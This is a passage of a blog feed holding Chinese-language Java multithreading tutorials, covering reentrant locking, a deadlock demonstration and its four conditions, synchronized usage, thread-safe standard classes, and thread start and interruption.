class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lock</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">               <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                   count++;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>2.两个线程，两把锁(无论是不是可重入锁都会死锁)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lock2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">A</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>(), B = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">synchronized</span> (A) &#123;</span><br><span class="line">               <span class="comment">//sleep一下,是给t2时间,让t2也能拿到B</span></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//尝试获取B,并没有释放A</span></span><br><span class="line">               <span class="keyword">synchronized</span> (B) &#123;</span><br><span class="line">                   System.out.println(<span class="string">&quot;t1拿到了两把锁&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">synchronized</span> (B) &#123;</span><br><span class="line">               <span class="comment">//sleep一下,是给t1时间,让t1能拿到A</span></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">//尝试获取A,并没有释放B</span></span><br><span class="line">               <span class="keyword">synchronized</span> (A) &#123;</span><br><span class="line">                   System.out.println(<span class="string">&quot;t2 拿到了两把锁&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现死锁是因为两个线程都卡在了获取对方已经得到锁的位置.<br><strong>n个线程得到m把锁</strong><br>OS课上老师讲过的哲学家就餐问题</p><h6 id="死锁的四个必要条件"><a href="#死锁的四个必要条件" class="headerlink" title="死锁的四个必要条件"></a>死锁的四个必要条件</h6><p>1.互斥使用<br>一个线程拿到锁A另一个线程也想拿到锁A，就需要阻塞等待.</p><p>2.不可抢占<br>一个线程拿到锁之后其他线程想拿到这个锁只能等待线程A释放这个锁</p><p>3.请求保持<br>一个线程拿到锁A之后，在获取A的基础上还想获取锁B.(吃着碗里的看着锅里的)</p><p>4.循环等待<br>两个或多个线程都想互相获取对方的锁，都进入等待队列.(最容易被破坏的 但修改加锁顺序可避免 )</p><p><strong>解决死锁的方案也就是破坏上述四个条件任何一个即可</strong><br>1)引入一个额外的锁<br>2)去掉一个线程<br>3)引入计数器<br>4)引入加锁规则【比较推荐 普世性高-&gt;sychronized】</p><h5 id="synchronized的使用方法"><a href="#synchronized的使用方法" class="headerlink" title="synchronized的使用方法"></a>synchronized的使用方法</h5><h6 id="1-修饰代码块"><a href="#1-修饰代码块" class="headerlink" title="1)修饰代码块"></a>1)修饰代码块</h6><p>锁任意对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        Synchronized (locker) &#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>锁任意对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        Synchronized (<span class="built_in">this</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h6 id="2-修饰实例方法"><a href="#2-修饰实例方法" class="headerlink" title="2)修饰实例方法"></a>2)修饰实例方法</h6><p><strong>注意 锁对象是什么不重要 重要的是两个线程中的对象是否是一个对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> count;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increase</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//此时使用this作为锁对象</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="3-修饰静态方法"><a href="#3-修饰静态方法" class="headerlink" title="3)修饰静态方法"></a>3)修饰静态方法</h6><p>针对类对象加锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">increase1</span><span class="params">()</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">increase2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(Counter.class) &#123;</span><br><span class="line">        <span class="comment">//Couter.class -&gt;类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意 类对象在一个java进程中是唯一的(代码中写了一个Counter的类对象，不会有多个)</strong></p><h5 id="Java标准库中的新城安全机制"><a href="#Java标准库中的新城安全机制" class="headerlink" title="Java标准库中的新城安全机制"></a>Java标准库中的新城安全机制</h5><p>Java 标准库中很多都是线程不安全的. 这些类可能会涉及到多线程修改共享数据, 又没有任何加锁措施.<br>如：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ArrayList</span>,LinkedList,<span class="built_in">HashMap</span>,TreeMap,HashSet,TreeSet,StringBuilder</span><br></pre></td></tr></table></figure><p>有一些是线程安全的.使用了一些锁机制来控制.<br>如：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Vector</span>(不推荐使用),<span class="built_in">HashTable</span>(不推荐使用),ConcurrentHashMap,<span class="built_in">StringBuffer</span>(不推荐使用)</span><br></pre></td></tr></table></figure><p>还有的是没有加锁,但因为不涉及修改的特殊类,也是线程安全的.</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x2_</title>
      <link href="/2024/09/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%8C/"/>
      <url>/2024/09/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="多线程篇二"><a href="#多线程篇二" class="headerlink" title="多线程篇二"></a>多线程篇二</h2><p><strong>如笔者理解有误，欢迎交流指正⭐</strong></p><h3 id="Thread中重要属性"><a href="#Thread中重要属性" class="headerlink" title="Thread中重要属性"></a>Thread中重要属性</h3><h4 id="启动线程start"><a href="#启动线程start" class="headerlink" title="启动线程start"></a>启动线程start</h4><p>上篇提到 **start 则是真正调用了系统 API, 在系统内核中创建出线程, 让线程再调用 run.**（“并发“的实现）<br>再用代码举例下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个类, 继承自 Thread .</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这个方法就是线程的入口方法.</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Welcome Thread!&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread</span>();     </span><br><span class="line">        <span class="comment">//thread.start();  交替打印</span></span><br><span class="line">        thread.run();</span><br><span class="line">        <span class="comment">//全部打印Welcome Thread!</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Main!&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="终止（中断）线程"><a href="#终止（中断）线程" class="headerlink" title="终止（中断）线程"></a>终止（中断）线程</h4><p>顾名思义，isInterrupted存在的意义就是为了帮助我们停止正在运行的线程.</p><h5 id="为什么要中断线程？"><a href="#为什么要中断线程？" class="headerlink" title="为什么要中断线程？"></a>为什么要中断线程？</h5><p>作为一个独立的单位，做一件事一定是有目的而且大多结果都是对自己有利，如果局面逐渐不可控制，甚至会造成损害那就有必要让其停下来或者直接取消对应的计划.<br><strong>在java中我们引入中断的目的就是未了打断线程所处的某种状态（这种状态一定是阻塞状态）</strong></p><h5 id="中断的实现"><a href="#中断的实现" class="headerlink" title="中断的实现"></a>中断的实现</h5><p>要终止&#x2F;销毁线程，就是要想办法让run方法尽快执行结束.</p><h5 id="手动创建标志位"><a href="#手动创建标志位" class="headerlink" title="手动创建标志位"></a>手动创建标志位</h5><p>我们可以在代码中手动创建标志位，作为run执行结束的条件.<br>上代码套餐.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程的打断</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo8</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">         <span class="type">boolean</span> <span class="variable">isQuit</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (!isQuit) &#123;</span><br><span class="line">                <span class="comment">// 此处的打印可以替换成任意的逻辑来表示线程的实际工作内容</span></span><br><span class="line">                System.out.println(<span class="string">&quot;线程工作中&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程工作完毕!&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        isQuit = <span class="literal">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;设置 isQuit 为 true&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行发现<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816205907546.png" alt="image-20240816205907546"></p><p><strong>为什么出现这样的情况？</strong><br>小小lambda 大大的力量😀<br>isQuit此时是成员变量，而lambda有一个语法规则”变量捕获“.</p><h6 id="变量捕获"><a href="#变量捕获" class="headerlink" title="变量捕获"></a>变量捕获</h6><p>lambda表达式会把当前作用域中的变量在lambda中cv一份（外面的变量是否销毁也就无关紧要了）<br><strong>注意：</strong><u>变量捕获的前提是必须只能捕获一个final或者”实际上是final“的变量.</u>（即初始化赋值后未改变值内容的“变量”）<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816205923769.png" alt="image-20240816205923769"><br>所以isQuit为成员变量时lambda捕获不到，就变成了<strong>“内部类访问外部类的属性”</strong>.就没有final的限制了.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程的打断</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo8</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">isQuit</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (!isQuit) &#123;</span><br><span class="line">                <span class="comment">// 此处的打印可以替换成任意的逻辑来表示线程的实际工作内容</span></span><br><span class="line">                System.out.println(<span class="string">&quot;线程工作中&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;线程工作完毕!&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        isQuit = <span class="literal">true</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;设置 isQuit 为 true&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><p>1.需要手动创建变量.<br>2.当线程内部sleep时，主线程修改变量，新线程不能及时响应.</p><h5 id="调用interrupt（）"><a href="#调用interrupt（）" class="headerlink" title="调用interrupt（）"></a>调用interrupt（）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程终止</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// Thread 类内部, 有一个现成的标志位, 可以用来判定当前的循环是否要结束.</span></span><br><span class="line">            <span class="keyword">while</span> (!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;线程工作中&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;让 t 线程终止. &quot;</span>);</span><br><span class="line">        thread.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>currentThread（）获取当前线程的实例（Thread thread）<br>Thread内部有一个标志位用来判断线程是否结束<br>thread.interrupted（）将Thread对象内部的标志位置为true（即使线程内部出现逻辑阻塞【sleep】也可以使用interrupted唤醒【使sleep内部触发一个异常 被提前唤醒】）<br>运行发现</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240816183840344.png" alt="image-20240816183840344"></p><p>sleep确实被唤醒了但是线程仍在工作，并未真正结束.<br><strong>注意：interrupted唤醒线程之后 ，sleep方法抛出异常，同时会自动清楚刚才设置的标志位</strong><br>有三方式可以让我们有更多的“操作空间”.<br>上代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程终止</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// Thread 类内部, 有一个现成的标志位, 可以用来判定当前的循环是否要结束.</span></span><br><span class="line">            <span class="keyword">while</span> (!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;线程工作中&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="comment">// 1. 假装没听见, 循环继续正常执行.</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="comment">// 2. 加上一个 break, 表示让线程立即结束.</span></span><br><span class="line">                    <span class="comment">// break;</span></span><br><span class="line">                    <span class="comment">// 3. 做一些其他工作, 完成之后再结束.</span></span><br><span class="line">                    <span class="comment">// 其他工作的代码放到这里.</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;让 t 线程终止. &quot;</span>);</span><br><span class="line">        thread.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>附：</strong></p><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">public void interrupt()</td><td align="center">中断对象关联的线程，如果线程正在阻塞，则以异常方式通知， 否则设置标志位</td></tr><tr><td align="center">public static boolean interrupted()</td><td align="center">判断当前线程的中断标志位是否设置，调用后清除标志位</td></tr><tr><td align="center">public boolean isInterrupted(）</td><td align="center">判断对象关联的线程的标志位是否设置，调用后不清除标志位</td></tr></tbody></table><h4 id="等待进程join"><a href="#等待进程join" class="headerlink" title="等待进程join"></a>等待进程join</h4><p>我们知道一个线程在完成它的工作后才能进行自己的下一步工作，但在期间想穿插别的工作进来就需要控制线程结束的顺序来实现.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 